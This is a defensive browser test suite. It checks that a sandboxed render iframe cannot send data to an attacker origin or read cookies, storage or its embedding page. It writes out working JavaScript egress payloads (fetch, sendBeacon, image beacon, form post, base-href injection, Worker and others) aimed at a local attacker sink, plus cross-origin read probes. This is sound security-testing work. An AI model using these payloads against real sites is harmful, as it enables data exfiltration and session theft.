# SPDX-License-Identifier: FSL-1.1-Apache-2.0
# Copyright (c) 2025 Open Computer Use Contributors
"""GROUP N: red-probes against the render frame's egress block.

Group M proves the render WORKS. Nothing proved it leaks nothing, and those are
independent claims: a frame that renders every format and quietly ships bytes to
an attacker passes every M test.

ADR-0026 (amended) lets the renderer run under `allow-scripts`, never
`allow-same-origin`. The isolation that remains is the opaque origin plus a
closed CSP allowlist on the renderer document. That is a claim about a running
browser, so it is checked in one — a real Chromium, the real headers, a real
attacker origin the probe can observe hits on.

Why not jsdom: measured, not assumed. Under jsdom a blocked fetch and an
unreachable host are the same `TypeError: fetch failed`, and the result is
byte-identical with a `default-src 'none'` meta present and absent. A red-probe
there would be green against no policy at all.

What this suite does NOT test, stated up front so a green is not read as more
than it is. Playwright injects each payload with `frame.evaluate`, which runs in
a CDP isolated world — code executes there even in a frame where a page script
could not start at all. So these probes measure the NETWORK layer: given running
code, can anything carry a byte out. They do not exercise the earlier leg, that
`script-src 'none'` and a sandbox without `allow-scripts` stop the script from
running in the first place. A frame that lost that leg entirely would still pass
every probe here. Verified rather than assumed: an isolated-world `fetch` and
`img` in a `srcdoc` frame under `connect-src 'none'; img-src 'none'` are blocked
by CSP and reach nothing, so the network claim these probes make is sound — it
is simply narrower than the whole invariant.

Every probe has three parts, and the third is what makes it worth running:

1. an ATTEMPT — real payload, real channel, executed in the frame;
2. an OBSERVATION — the sink saw nothing (not merely "the call threw", since a
   call can throw for reasons that have nothing to do with policy);
3. a CONTROL — the same channel reaches the sink from a context WITHOUT the
   policy. Without it, a probe passes when the channel was never live, the sink
   was down, or the payload never ran.

The channels are the ones a closed allowlist has to cover, and they do not all
fall to the same directive: fetch/XHR, sendBeacon, image beacon, form post,
window.open, `<base href>` injection, same-frame self-navigation, Worker,
WebRTC, prefetch. `base-uri` and `form-action` do not inherit from
`default-src`; self-navigation is not a fetch at all and no fetch directive
touches it.
"""

from __future__ import annotations

import http.server
import os
import socket
import threading

import pytest

_BROWSER_GATE = os.environ.get("OCU_BROWSER_E2E")

# The pane is served here; the portal frames it. Same constants as group M --
# reach the portal via localhost, not 127.0.0.1, or the pane's frame-ancestors
# refuses and the iframe drops to chrome-error.
PORTAL_URL = "http://localhost:3003"
PANE_FRAME_URL = "localhost:3000"


def _require_browser() -> None:
    """Gate + anti-vacuity: gate-set-but-no-chromium is a FAIL, not a skip."""
    if not _BROWSER_GATE:
        pytest.skip(
            "OCU_BROWSER_E2E not set: the eyes-in-browser N-group is opt-in "
            "(run in the VM jvenv with playwright+chromium). LOUD SKIP."
        )
    try:
        from playwright.sync_api import sync_playwright  # noqa: F401
    except ImportError as exc:
        pytest.fail(
            "OCU_BROWSER_E2E is SET but playwright is not importable: "
            f"{exc}. A missing browser under the gate is a FAILURE, not a "
            "skip. Install: /tmp/jvenv/bin/pip install playwright && "
            "/tmp/jvenv/bin/python -m playwright install chromium."
        )


class _Sink:
    """An attacker-controlled origin that records every request it receives.

    The probes assert on what this saw, not on whether a JS call threw. A
    `fetch()` rejects for a blocked request and for an unreachable host alike;
    only the sink distinguishes "policy refused it" from "it never got there".
    """

    def __init__(self) -> None:
        self.hits: list[str] = []
        self._server: http.server.ThreadingHTTPServer | None = None
        self._thread: threading.Thread | None = None
        self.port = 0

    def start(self) -> None:
        hits = self.hits

        class _Handler(http.server.BaseHTTPRequestHandler):
            # BaseHTTPRequestHandler reverse-resolves the peer address on every
            # connection, which costs ~35s per server here before a single byte
            # moves. The probes time out long before that and report "no leak"
            # for a channel that was never given a chance to leak.
            def address_string(self) -> str:  # noqa: D102
                return self.client_address[0]

            def _record(self) -> None:
                hits.append(f"{self.command} {self.path}")
                self.send_response(200)
                self.send_header("Content-Type", "image/gif")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(b"GIF89a")

            def do_GET(self) -> None:  # noqa: N802
                if self.path == "/__control__":
                    # A real http origin on the same address space as the sink.
                    # The control CANNOT run from about:blank: Chromium's
                    # Private Network Access refuses a null, insecure origin
                    # reaching loopback, so every channel reports dead and the
                    # control fails for a reason that has nothing to do with
                    # the payloads. Measured, not assumed.
                    body = b"<!doctype html><meta charset=utf-8><title>control</title>"
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html; charset=utf-8")
                    self.send_header("Content-Length", str(len(body)))
                    self.end_headers()
                    self.wfile.write(body)
                    return
                self._record()

            do_POST = _record

            def log_message(self, *_args) -> None:  # keep pytest output clean
                return

        class _FastServer(http.server.ThreadingHTTPServer):
            # HTTPServer.server_bind() calls socket.getfqdn() to fill
            # server_name. On a host whose reverse lookup stalls that costs ~35s
            # per sink, measured -- before any probe runs. The name is never
            # used here (probes address the sink by 127.0.0.1:port), so bind
            # without resolving.
            def server_bind(self) -> None:
                self.socket.bind(self.server_address)
                host, port = self.server_address[:2]
                self.server_name = host
                self.server_port = port

        with socket.socket() as probe:
            probe.bind(("127.0.0.1", 0))
            self.port = probe.getsockname()[1]
        self._server = _FastServer(("127.0.0.1", self.port), _Handler)
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        if self._server is not None:
            self._server.shutdown()
            self._server.server_close()

    @property
    def url(self) -> str:
        return f"http://127.0.0.1:{self.port}"

    def saw(self, marker: str) -> bool:
        return any(marker in hit for hit in self.hits)


# Each entry: (channel name, JS that attempts the leak, marker in the URL).
# The JS runs inside the render frame; `SINK` is substituted per run.
_CHANNELS: list[tuple[str, str]] = [
    ("fetch", "fetch(SINK + '/fetch-MARKER').catch(() => {})"),
    ("xhr", "(() => { const x = new XMLHttpRequest(); x.open('GET', SINK + '/xhr-MARKER'); try { x.send() } catch (e) {} })()"),
    ("sendBeacon", "try { navigator.sendBeacon(SINK + '/beacon-MARKER', 'x') } catch (e) {}"),
    ("image beacon", "(() => { const i = new Image(); i.src = SINK + '/img-MARKER' })()"),
    ("form post", "(() => { const f = document.createElement('form'); f.method = 'POST'; f.action = SINK + '/form-MARKER'; document.body.appendChild(f); try { f.submit() } catch (e) {} })()"),
    ("window.open", "try { window.open(SINK + '/open-MARKER') } catch (e) {}"),
    ("base href", "(() => { const b = document.createElement('base'); b.href = SINK + '/base-MARKER/'; document.head.appendChild(b); const i = new Image(); i.src = 'relative-MARKER' })()"),
    ("self-navigation", "try { location.href = SINK + '/nav-MARKER' } catch (e) {}"),
    ("worker", "try { new Worker(URL.createObjectURL(new Blob([\"fetch('\" + SINK + \"/worker-MARKER')\"], {type: 'text/javascript'}))) } catch (e) {}"),
    ("prefetch", "(() => { const l = document.createElement('link'); l.rel = 'prefetch'; l.href = SINK + '/prefetch-MARKER'; document.head.appendChild(l) })()"),
]


# One budget for both probe families, so a channel is never given less time to
# leak than it was given to prove it can.
_SETTLE_MS = 2500


def _await_hit(page, sink: "_Sink", marker: str) -> bool:
    """Wait until the sink records `marker`, or the budget expires.

    A flat sleep is the wrong instrument in both directions: too short and a
    slow channel reads as "no leak" under CI load, too long and every clean
    probe pays for it. Polling ends the moment a hit lands, and only spends the
    full budget when there is nothing to see.
    """
    waited = 0
    while waited < _SETTLE_MS:
        if sink.saw(marker):
            return True
        page.wait_for_timeout(100)
        waited += 100
    return sink.saw(marker)


def _attempt(context, payload: str) -> None:
    """Run a leak attempt, tolerating the context navigating away.

    The self-navigation channel destroys its own execution context by design —
    that IS the attempt. Playwright raises for the destroyed context, which
    would fail the whole test instead of recording one channel's outcome. The
    verdict comes from the sink either way, so the raise is not information.
    """
    try:
        context.evaluate(f"() => {{ {payload} }}")
    except Exception as exc:  # noqa: BLE001 - any evaluate failure is not the verdict
        if "context was destroyed" not in str(exc) and "Execution context" not in str(exc):
            raise


# The render frame is a CHILD of the pane, not the pane. The pane is the SPA
# origin at :3000; the sandboxed renderer is nested inside it and is opaque, so
# Playwright reports its URL as the renderer-document route (or about:srcdoc /
# blob: depending on how it is served). Matching on the pane URL would hand the
# probes the SPA origin and quietly assert the wrong thing.
_RENDER_FRAME_MARKERS = ("/render", "about:srcdoc", "blob:")


def _render_frame(page):
    """The sandboxed render frame, or None when the page has no such child.

    Deliberately NOT the pane. A probe that runs in the pane measures the SPA
    origin's policy, and the SPA origin may well refuse these channels — which
    would make every probe green while proving nothing about the sandbox this
    file exists to test.
    """
    pane = next((f for f in page.frames if PANE_FRAME_URL in (f.url or "")), None)
    if pane is None:
        return None
    for frame in pane.child_frames:
        url = frame.url or ""
        if any(marker in url for marker in _RENDER_FRAME_MARKERS):
            return frame
    return None


def test_n0_the_sink_records_a_hit_when_nothing_blocks_it():
    """Control for every probe below: the sink is reachable and does record.

    Without this, a suite where the sink failed to bind, or where the marker
    never matched, reports "no leak" for every channel and looks like a pass.
    """
    sink = _Sink()
    sink.start()
    try:
        import urllib.request

        urllib.request.urlopen(f"{sink.url}/control-marker", timeout=5).read()
        assert sink.saw("control-marker"), (
            "the sink did not record a request it definitely received, so every "
            "egress probe in this file would report 'no leak' vacuously"
        )
    finally:
        sink.stop()


@pytest.mark.parametrize("channel,js", _CHANNELS, ids=[c for c, _ in _CHANNELS])
def test_n1_the_render_frame_reaches_no_attacker_origin(channel: str, js: str):
    """No channel carries a byte out of the render frame.

    Runs the attempt inside the frame, then asserts the attacker origin saw
    nothing. The assertion is on the SINK rather than on whether the JS threw:
    a throw proves the call failed, not that policy is why.
    """
    _require_browser()
    from playwright.sync_api import sync_playwright

    marker = channel.replace(" ", "-").replace(".", "")
    sink = _Sink()
    sink.start()
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch()
            try:
                page = browser.new_page()
                page.goto(PORTAL_URL, wait_until="networkidle", timeout=30000)
                frame = _render_frame(page)
                assert frame is not None, (
                    "no sandboxed render frame under the pane, so this probe "
                    "would run nowhere or — worse — in the pane's own SPA "
                    "origin and pass while proving nothing about the sandbox. "
                    "The render frame ships with the ADR-0026 substrate; until "
                    "then this FAILS rather than passing vacuously. Frames "
                    f"seen: {[f.url for f in page.frames]!r}"
                )
                payload = js.replace("SINK", repr(sink.url)).replace("MARKER", marker)
                _attempt(frame, payload)
                # Spends the full budget here by design: this probe expects no
                # hit, so it must wait as long as the control gives a channel
                # to produce one.
                _await_hit(page, sink, marker)
            finally:
                browser.close()

        assert not sink.saw(marker), (
            f"the {channel} channel carried a request out of the render frame to "
            f"an attacker origin: {sink.hits!r}. The frame's egress block is not "
            "closed for this channel — check the renderer document's CSP "
            "(remembering that base-uri and form-action do NOT inherit from "
            "default-src, and that a same-frame navigation is not a fetch at "
            "all, so no fetch directive touches it)."
        )
    finally:
        sink.stop()


def test_n2_the_same_channels_reach_the_sink_from_an_unpoliced_page():
    """The probes above are not measuring dead channels.

    Each channel is exercised from a plain page with no CSP and no sandbox. If a
    channel cannot reach the sink even there, its probe in n1 proves nothing —
    the browser, the payload, or the sink is what stopped it, not the policy.
    Reports every channel that failed the control rather than the first.
    """
    _require_browser()
    from playwright.sync_api import sync_playwright

    sink = _Sink()
    sink.start()
    dead: list[str] = []
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch()
            try:
                page = browser.new_page()
                for channel, js in _CHANNELS:
                    marker = "ctl-" + channel.replace(" ", "-").replace(".", "")
                    # Served BY the sink: a real http origin on the same
                    # address space, so Private Network Access does not refuse
                    # the hop. No CSP, no sandbox — a channel that cannot reach
                    # the sink from here is not a live channel.
                    page.goto(f"{sink.url}/__control__")
                    payload = js.replace("SINK", repr(sink.url)).replace("MARKER", marker)
                    _attempt(page, payload)
                    if not _await_hit(page, sink, marker):
                        dead.append(channel)
            finally:
                browser.close()

        assert not dead, (
            f"these channels never reached the sink even unpoliced: {dead}. Their "
            "n1 probes are vacuous — they would pass against a frame with no "
            "policy at all. Fix the payload or drop the channel; do not leave a "
            f"green that measures nothing. What the sink DID record: {sink.hits!r}"
        )
    finally:
        sink.stop()

# The read side of the same claim. ADR-0026 says the frame "cannot read a
# cookie, a token, another artifact, or anything in the embedder" — a different
# property from "cannot send", and one nothing was checking either. An opaque
# origin is what closes these: no cookie jar, no storage bucket, no same-origin
# handle on the parent.
#
# Each entry returns a string. A probe passes when the frame CANNOT reach the
# thing: either the access throws (SecurityError / TypeError) or it yields an
# empty result. Anything else is a read the ADR says is impossible.
_READS: list[tuple[str, str]] = [
    ("document.cookie", "document.cookie"),
    ("localStorage", "(() => { try { localStorage.setItem('x','1'); return 'READABLE:' + localStorage.getItem('x') } catch (e) { return 'THREW:' + e.name } })()"),
    ("sessionStorage", "(() => { try { sessionStorage.setItem('x','1'); return 'READABLE:' + sessionStorage.getItem('x') } catch (e) { return 'THREW:' + e.name } })()"),
    ("indexedDB", "(() => { try { const r = indexedDB.open('probe'); return r ? 'OPENED' : 'NO-HANDLE' } catch (e) { return 'THREW:' + e.name } })()"),
    ("parent DOM", "(() => { try { return 'READ:' + String(parent.document.body.innerHTML).slice(0, 40) } catch (e) { return 'THREW:' + e.name } })()"),
    ("parent location", "(() => { try { return 'READ:' + parent.location.href } catch (e) { return 'THREW:' + e.name } })()"),
    ("top location", "(() => { try { return 'READ:' + top.location.href } catch (e) { return 'THREW:' + e.name } })()"),
    ("own origin", "(() => { try { return 'ORIGIN:' + String(origin) } catch (e) { return 'THREW:' + e.name } })()"),
]


@pytest.mark.parametrize("surface,js", _READS, ids=[s for s, _ in _READS])
def test_n3_the_render_frame_reads_nothing_it_does_not_own(surface: str, js: str):
    """No cookie, no storage, no reach into the embedder.

    The opaque origin is what closes these, so this doubles as the check that
    the frame IS opaque: `origin` reads "null" in an opaque origin and reads the
    real origin the moment someone adds `allow-same-origin`. That single line is
    the difference between this whole file testing a sandbox and testing an
    ordinary same-origin iframe.
    """
    _require_browser()
    from playwright.sync_api import sync_playwright

    with sync_playwright() as p:
        browser = p.chromium.launch()
        try:
            page = browser.new_page()
            page.goto(PORTAL_URL, wait_until="networkidle", timeout=30000)
            frame = _render_frame(page)
            assert frame is not None, (
                "no sandboxed render frame under the pane; this probe would "
                "otherwise run in the SPA origin, where every read below "
                f"SUCCEEDS by design. Frames seen: {[f.url for f in page.frames]!r}"
            )
            result = str(frame.evaluate(f"() => {{ return {js} }}"))
        finally:
            browser.close()

    if surface == "own origin":
        assert result == "ORIGIN:null", (
            f"the render frame reports origin {result!r}, not an opaque one. "
            "Every other probe in this file assumes the opaque origin is what "
            "isolates; with a real origin they are all measuring an ordinary "
            "same-origin iframe. Check the sandbox attribute did not gain "
            "`allow-same-origin`."
        )
        return

    assert result.startswith("THREW:") or result in ("", "NO-HANDLE"), (
        f"the render frame reached {surface}: {result!r}. ADR-0026 states it "
        "cannot read a cookie, a token, another artifact, or anything in the "
        "embedder — this is that claim failing, not a flaky probe."
    )
